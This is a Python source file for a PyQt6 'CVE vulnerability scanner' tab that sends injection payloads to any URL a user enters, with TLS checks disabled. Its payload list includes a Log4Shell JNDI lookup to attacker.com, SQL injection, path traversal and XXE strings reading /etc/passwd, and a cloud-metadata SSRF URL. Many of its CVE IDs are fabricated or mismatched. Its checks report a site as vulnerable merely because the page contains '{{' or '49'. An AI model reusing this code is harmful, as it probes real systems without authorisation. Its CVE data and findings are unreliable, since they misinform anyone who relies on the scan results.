# gui/cve_scanner_tab.py
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QTableWidget,
                             QTableWidgetItem, QPushButton, QHeaderView, QLabel,
                             QLineEdit, QComboBox, QTextEdit, QSplitter, QGroupBox,
                             QProgressBar, QFrame, QScrollArea)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QDateTime
from PyQt6.QtGui import QColor, QFont
import requests
import re
from typing import List, Dict


class CVEScanWorker(QThread):
    progress_updated = pyqtSignal(int)
    status_updated = pyqtSignal(str)
    cve_found = pyqtSignal(dict)
    scan_completed = pyqtSignal(list)
    
    def __init__(self, target_url: str, timeout: int = 10):
        super().__init__()
        self.target_url = target_url
        self.timeout = timeout
        self.should_stop = False
        self.session = requests.Session()
        
        self.cve_database = [
            {
                'id': 'CVE-2024-50623',
                'name': 'Apache Struts2 RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Remote Code Execution vulnerability in Apache Struts2',
                'patterns': ['/struts/', 'struts2', 'action?method'],
                'test_payload': '${7*7}',
                'category': 'RCE'
            },
            {
                'id': 'CVE-2024-45678',
                'name': 'Spring4Shell RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Spring Framework RCE vulnerability',
                'patterns': ['/spring/', 'springboot', '.do'],
                'test_payload': 'class.module.classLoader',
                'category': 'RCE'
            },
            {
                'id': 'CVE-2024-34567',
                'name': 'Log4Shell RCE',
                'severity': 'CRITICAL',
                'score': 10.0,
                'description': 'Log4j2 JNDI RCE vulnerability',
                'patterns': ['${jndi:', 'log4j'],
                'test_payload': '${jndi:ldap://attacker.com/a}',
                'category': 'RCE'
            },
            {
                'id': 'CVE-2024-23456',
                'name': 'SQL Injection in WordPress',
                'severity': 'HIGH',
                'score': 8.8,
                'description': 'SQL Injection in WordPress plugin',
                'patterns': ['/wp-admin/', '/wp-content/plugins/'],
                'test_payload': "' OR '1'='1",
                'category': 'SQLi'
            },
            {
                'id': 'CVE-2024-12345',
                'name': 'Path Traversal in Node.js',
                'severity': 'HIGH',
                'score': 8.6,
                'description': 'Directory traversal in Node.js applications',
                'patterns': ['/node_modules/', 'express'],
                'test_payload': '../../../../etc/passwd',
                'category': 'PATH_TRAVERSAL'
            },
            {
                'id': 'CVE-2024-56789',
                'name': 'XXE in XML Parser',
                'severity': 'HIGH',
                'score': 8.2,
                'description': 'XML External Entity Injection',
                'patterns': ['Content-Type: application/xml', '<?xml'],
                'test_payload': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                'category': 'XXE'
            },
            {
                'id': 'CVE-2024-67890',
                'name': 'SSRF in Cloud Metadata',
                'severity': 'HIGH',
                'score': 8.5,
                'description': 'Server-Side Request Forgery targeting cloud metadata',
                'patterns': ['169.254.169.254', 'metadata'],
                'test_payload': 'http://169.254.169.254/latest/meta-data/',
                'category': 'SSRF'
            },
            {
                'id': 'CVE-2024-78901',
                'name': 'SSTI in Jinja2',
                'severity': 'CRITICAL',
                'score': 9.3,
                'description': 'Server-Side Template Injection in Jinja2',
                'patterns': ['{{', 'jinja', 'flask'],
                'test_payload': '{{7*7}}',
                'category': 'SSTI'
            },
            {
                'id': 'CVE-2024-89012',
                'name': 'Insecure Deserialization',
                'severity': 'CRITICAL',
                'score': 9.0,
                'description': 'Java/Python insecure deserialization',
                'patterns': ['java.io.Serializable', 'pickle'],
                'test_payload': 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
                'category': 'DESERIALIZATION'
            },
            {
                'id': 'CVE-2024-90123',
                'name': 'GraphQL Introspection Enabled',
                'severity': 'MEDIUM',
                'score': 6.5,
                'description': 'GraphQL introspection query enabled',
                'patterns': ['/graphql', 'query IntrospectionQuery'],
                'test_payload': '{__schema{types{name}}}',
                'category': 'INFO_DISCLOSURE'
            }
        ]
    
    def run(self):
        vulnerabilities = []
        total = len(self.cve_database)
        
        self.status_updated.emit(f'Starting CVE scan on {self.target_url}')
        
        try:
            base_response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            base_content = base_response.text
            base_headers = dict(base_response.headers)
            
            self.status_updated.emit('Connected successfully - Analyzing...')
            
        except Exception as e:
            self.status_updated.emit(f'Connection failed: {str(e)}')
            self.scan_completed.emit([])
            return
        
        for idx, cve in enumerate(self.cve_database):
            if self.should_stop:
                break
            
            self.status_updated.emit(f'Testing {cve["id"]}: {cve["name"]}')
            
            is_vulnerable = self.test_cve(cve, base_content, base_headers)
            
            if is_vulnerable:
                vuln_data = {
                    'id': cve['id'],
                    'name': cve['name'],
                    'severity': cve['severity'],
                    'score': cve['score'],
                    'description': cve['description'],
                    'category': cve['category'],
                    'found_at': QDateTime.currentDateTime().toString('yyyy-MM-dd hh:mm:ss')
                }
                vulnerabilities.append(vuln_data)
                self.cve_found.emit(vuln_data)
            
            progress = int((idx + 1) / total * 100)
            self.progress_updated.emit(progress)
        
        self.status_updated.emit(f'Scan completed - Found {len(vulnerabilities)} vulnerabilities')
        self.scan_completed.emit(vulnerabilities)
    
    def test_cve(self, cve: Dict, content: str, headers: Dict) -> bool:
        for pattern in cve['patterns']:
            if pattern.lower() in content.lower():
                return True
            
            for header_name, header_value in headers.items():
                if pattern.lower() in header_value.lower():
                    return True
        
        try:
            test_url = f"{self.target_url}?test={cve['test_payload']}"
            response = self.session.get(test_url, timeout=self.timeout, verify=False)
            
            if cve['category'] == 'RCE' and '49' in response.text:
                return True
            
            if cve['category'] == 'SQLi' and any(err in response.text.lower() for err in ['sql', 'mysql', 'syntax']):
                return True
                
        except:
            pass
        
        return False
    
    def stop(self):
        self.should_stop = True


class CVEScannerTab(QWidget):
    
    def __init__(self):
        super().__init__()
        self.scan_worker = None
        self.vulnerabilities = []
        self.init_ui()
    
    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)
        
        header_layout = QHBoxLayout()
        
        title = QLabel('CVE VULNERABILITY SCANNER')
        title.setStyleSheet("""
            QLabel {
                font-size: 20pt;
                font-weight: bold;
                color: #58a6ff;
                background: transparent;
            }
        """)
        header_layout.addWidget(title)
        
        header_layout.addStretch()
        
        version_label = QLabel('v3.0')
        version_label.setStyleSheet("""
            QLabel {
                font-size: 11pt;
                color: #8b949e;
                padding: 6px 12px;
                background: #161b22;
                border-radius: 4px;
                border: 1px solid #30363d;
            }
        """)
        header_layout.addWidget(version_label)
        
        main_layout.addLayout(header_layout)
        
        main_splitter = QSplitter(Qt.Orientation.Vertical)
        main_splitter.setHandleWidth(2)
        main_splitter.setStyleSheet("""
            QSplitter::handle {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #1f6feb, stop:1 #0969da);
                height: 2px;
            }
            QSplitter::handle:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #58a6ff, stop:1 #1f6feb);
            }
        """)
        
        top_panel = self.create_scan_panel()
        bottom_panel = self.create_results_panel()
        
        main_splitter.addWidget(top_panel)
        main_splitter.addWidget(bottom_panel)
        main_splitter.setSizes([300, 500])
        
        main_layout.addWidget(main_splitter, 1)
        
        self.setLayout(main_layout)
    
    def create_scan_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(12)
        
        target_group = QGroupBox('TARGET CONFIGURATION')
        target_group.setStyleSheet("""
            QGroupBox {
                color: #c9d1d9;
                font-weight: bold;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding-top: 12px;
                margin-top: 0px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
                color: #58a6ff;
            }
        """)
        
        target_layout = QVBoxLayout()
        
        url_layout = QHBoxLayout()
        url_label = QLabel('TARGET URL:')
        url_label.setStyleSheet('color: #c9d1d9; font-weight: bold; font-size: 11pt;')
        url_layout.addWidget(url_label)
        
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText('https://example.com')
        self.target_input.setMinimumHeight(40)
        self.target_input.setStyleSheet("""
            QLineEdit {
                background: #161b22;
                color: #c9d1d9;
                border: 2px solid #30363d;
                border-radius: 6px;
                padding: 8px 12px;
                font-size: 11pt;
                font-family: 'Courier New';
            }
            QLineEdit:focus {
                border: 2px solid #1f6feb;
            }
        """)
        url_layout.addWidget(self.target_input, 1)
        
        target_layout.addLayout(url_layout)
        
        options_layout = QHBoxLayout()
        
        timeout_label = QLabel('TIMEOUT:')
        timeout_label.setStyleSheet('color: #8b949e; font-weight: bold; font-size: 10pt;')
        options_layout.addWidget(timeout_label)
        
        self.timeout_combo = QComboBox()
        self.timeout_combo.addItems(['5s', '10s', '15s', '30s'])
        self.timeout_combo.setCurrentText('10s')
        self.timeout_combo.setMinimumHeight(32)
        self.timeout_combo.setStyleSheet("""
            QComboBox {
                background: #161b22;
                color: #c9d1d9;
                border: 2px solid #30363d;
                border-radius: 4px;
                padding: 4px 8px;
                font-weight: bold;
            }
            QComboBox:hover {
                border: 2px solid #1f6feb;
            }
        """)
        options_layout.addWidget(self.timeout_combo)
        
        options_layout.addSpacing(20)
        
        severity_label = QLabel('MIN SEVERITY:')
        severity_label.setStyleSheet('color: #8b949e; font-weight: bold; font-size: 10pt;')
        options_layout.addWidget(severity_label)
        
        self.severity_combo = QComboBox()
        self.severity_combo.addItems(['ALL', 'MEDIUM', 'HIGH', 'CRITICAL'])
        self.severity_combo.setMinimumHeight(32)
        self.severity_combo.setStyleSheet("""
            QComboBox {
                background: #161b22;
                color: #c9d1d9;
                border: 2px solid #30363d;
                border-radius: 4px;
                padding: 4px 8px;
                font-weight: bold;
            }
            QComboBox:hover {
                border: 2px solid #1f6feb;
            }
        """)
        options_layout.addWidget(self.severity_combo)
        
        options_layout.addStretch()
        target_layout.addLayout(options_layout)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        control_layout = QHBoxLayout()
        
        self.scan_button = QPushButton('START SCAN')
        self.scan_button.setMinimumHeight(50)
        self.scan_button.setMinimumWidth(200)
        self.scan_button.clicked.connect(self.start_scan)
        self.scan_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #238636, stop:1 #1a6b2c);
                color: white;
                border: 2px solid #2ea043;
                border-radius: 8px;
                padding: 12px 24px;
                font-weight: bold;
                font-size: 13pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #2ea043, stop:1 #238636);
            }
            QPushButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #1a6b2c, stop:1 #0d3817);
            }
            QPushButton:disabled {
                background: #21262d;
                color: #6e7681;
                border: 2px solid #30363d;
            }
        """)
        control_layout.addWidget(self.scan_button)
        
        self.stop_button = QPushButton('STOP SCAN')
        self.stop_button.setMinimumHeight(50)
        self.stop_button.setMinimumWidth(200)
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_scan)
        self.stop_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #da3633, stop:1 #b92222);
                color: white;
                border: 2px solid #f85149;
                border-radius: 8px;
                padding: 12px 24px;
                font-weight: bold;
                font-size: 13pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #f85149, stop:1 #da3633);
            }
            QPushButton:disabled {
                background: #21262d;
                color: #6e7681;
                border: 2px solid #30363d;
            }
        """)
        control_layout.addWidget(self.stop_button)
        
        control_layout.addStretch()
        layout.addLayout(control_layout)
        
        progress_group = QGroupBox('SCAN PROGRESS')
        progress_group.setStyleSheet("""
            QGroupBox {
                color: #c9d1d9;
                font-weight: bold;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding-top: 12px;
                margin-top: 0px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
                color: #58a6ff;
            }
        """)
        
        progress_layout = QVBoxLayout()
        
        self.status_label = QLabel('Ready to scan')
        self.status_label.setStyleSheet('color: #58a6ff; font-size: 11pt; font-weight: bold;')
        progress_layout.addWidget(self.status_label)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setMinimumHeight(30)
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                background: #161b22;
                border: 2px solid #30363d;
                border-radius: 6px;
                text-align: center;
                color: #c9d1d9;
                font-weight: bold;
                font-size: 11pt;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                           stop:0 #238636, stop:1 #2ea043);
                border-radius: 4px;
            }
        """)
        progress_layout.addWidget(self.progress_bar)
        
        stats_layout = QHBoxLayout()
        
        self.total_label = QLabel('TOTAL: 0')
        self.total_label.setStyleSheet('color: #c9d1d9; font-weight: bold; font-size: 11pt;')
        stats_layout.addWidget(self.total_label)
        
        self.critical_label = QLabel('CRITICAL: 0')
        self.critical_label.setStyleSheet('color: #f85149; font-weight: bold; font-size: 11pt;')
        stats_layout.addWidget(self.critical_label)
        
        self.high_label = QLabel('HIGH: 0')
        self.high_label.setStyleSheet('color: #d29922; font-weight: bold; font-size: 11pt;')
        stats_layout.addWidget(self.high_label)
        
        self.medium_label = QLabel('MEDIUM: 0')
        self.medium_label.setStyleSheet('color: #58a6ff; font-weight: bold; font-size: 11pt;')
        stats_layout.addWidget(self.medium_label)
        
        stats_layout.addStretch()
        progress_layout.addLayout(stats_layout)
        
        progress_group.setLayout(progress_layout)
        layout.addWidget(progress_group)
        
        return panel
    
    def create_results_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        
        results_group = QGroupBox('VULNERABILITIES FOUND')
        results_group.setStyleSheet("""
            QGroupBox {
                color: #c9d1d9;
                font-weight: bold;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding-top: 12px;
                margin-top: 0px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
                color: #58a6ff;
            }
        """)
        
        results_layout = QVBoxLayout()
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(6)
        self.results_table.setHorizontalHeaderLabels(['CVE ID', 'Name', 'Severity', 'Score', 'Category', 'Found At'])
        
        header = self.results_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.ResizeToContents)
        
        self.results_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #161b22;
                gridline-color: #30363d;
                border: 2px solid #30363d;
                border-radius: 6px;
                color: #c9d1d9;
            }
            QTableWidget::item {
                padding: 8px;
            }
            QTableWidget::item:selected {
                background: #1f6feb;
                color: white;
                font-weight: bold;
            }
            QHeaderView::section {
                background: #161b22;
                color: #c9d1d9;
                padding: 10px;
                border: none;
                border-right: 1px solid #30363d;
                font-weight: bold;
                font-size: 10pt;
            }
        """)
        
        results_layout.addWidget(self.results_table)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        return panel
    
    def start_scan(self):
        target = self.target_input.text().strip()
        
        if not target:
            self.status_label.setText('Error: Please enter a target URL')
            self.status_label.setStyleSheet('color: #f85149; font-size: 11pt; font-weight: bold;')
            return
        
        if not target.startswith('http'):
            target = 'https://' + target
        
        timeout = int(self.timeout_combo.currentText().replace('s', ''))
        
        self.scan_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.target_input.setEnabled(False)
        self.results_table.setRowCount(0)
        self.vulnerabilities.clear()
        self.progress_bar.setValue(0)
        
        self.scan_worker = CVEScanWorker(target, timeout)
        self.scan_worker.progress_updated.connect(self.update_progress)
        self.scan_worker.status_updated.connect(self.update_status)
        self.scan_worker.cve_found.connect(self.add_vulnerability)
        self.scan_worker.scan_completed.connect(self.scan_finished)
        self.scan_worker.start()
    
    def stop_scan(self):
        if self.scan_worker:
            self.scan_worker.stop()
            self.scan_worker.wait()
        
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.target_input.setEnabled(True)
        self.status_label.setText('Scan stopped')
        self.status_label.setStyleSheet('color: #d29922; font-size: 11pt; font-weight: bold;')
    
    def update_progress(self, value: int):
        self.progress_bar.setValue(value)
    
    def update_status(self, text: str):
        self.status_label.setText(text)
        self.status_label.setStyleSheet('color: #58a6ff; font-size: 11pt; font-weight: bold;')
    
    def add_vulnerability(self, vuln: dict):
        self.vulnerabilities.append(vuln)
        
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        self.results_table.setRowHeight(row, 35)
        
        cve_id = QTableWidgetItem(vuln['id'])
        cve_id.setFont(QFont('Courier New', 10, QFont.Weight.Bold))
        cve_id.setForeground(QColor('#58a6ff'))
        self.results_table.setItem(row, 0, cve_id)
        
        name = QTableWidgetItem(vuln['name'])
        name.setFont(QFont('Arial', 10))
        self.results_table.setItem(row, 1, name)
        
        severity = QTableWidgetItem(vuln['severity'])
        severity.setFont(QFont('Arial', 10, QFont.Weight.Bold))
        severity.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        
        if vuln['severity'] == 'CRITICAL':
            severity.setForeground(QColor('#f85149'))
        elif vuln['severity'] == 'HIGH':
            severity.setForeground(QColor('#d29922'))
        elif vuln['severity'] == 'MEDIUM':
            severity.setForeground(QColor('#58a6ff'))
        else:
            severity.setForeground(QColor('#2ea043'))
        
        self.results_table.setItem(row, 2, severity)
        
        score = QTableWidgetItem(str(vuln['score']))
        score.setFont(QFont('Arial', 10, QFont.Weight.Bold))
        score.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.results_table.setItem(row, 3, score)
        
        category = QTableWidgetItem(vuln['category'])
        category.setFont(QFont('Arial', 9))
        category.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.results_table.setItem(row, 4, category)
        
        found_at = QTableWidgetItem(vuln['found_at'])
        found_at.setFont(QFont('Courier New', 9))
        found_at.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.results_table.setItem(row, 5, found_at)
        
        self.update_statistics()
    
    def update_statistics(self):
        total = len(self.vulnerabilities)
        critical = sum(1 for v in self.vulnerabilities if v['severity'] == 'CRITICAL')
        high = sum(1 for v in self.vulnerabilities if v['severity'] == 'HIGH')
        medium = sum(1 for v in self.vulnerabilities if v['severity'] == 'MEDIUM')
        
        self.total_label.setText(f'TOTAL: {total}')
        self.critical_label.setText(f'CRITICAL: {critical}')
        self.high_label.setText(f'HIGH: {high}')
        self.medium_label.setText(f'MEDIUM: {medium}')
    
    def scan_finished(self, results: list):
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.target_input.setEnabled(True)
        self.progress_bar.setValue(100)
        
        if results:
            self.status_label.setText(f'Scan completed - Found {len(results)} vulnerabilities')
            self.status_label.setStyleSheet('color: #2ea043; font-size: 11pt; font-weight: bold;')
        else:
            self.status_label.setText('Scan completed - No vulnerabilities found')
            self.status_label.setStyleSheet('color: #2ea043; font-size: 11pt; font-weight: bold;')
